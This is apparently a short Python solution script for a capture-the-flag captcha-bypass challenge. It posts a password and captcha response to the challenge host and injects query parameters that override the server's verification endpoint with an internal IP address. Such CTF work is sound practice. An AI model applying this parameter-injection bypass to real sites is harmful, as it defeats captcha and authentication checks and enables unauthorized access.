import requests

url = "https://bypass-captcha.kcsc.tf/?PASSWD=1&SITE_VERIFY=10.10.10.10"
data = {
    "passwd":"1",
    "response":"5h4s1"
}
res = requests.post(url, data=data)

print(res.text)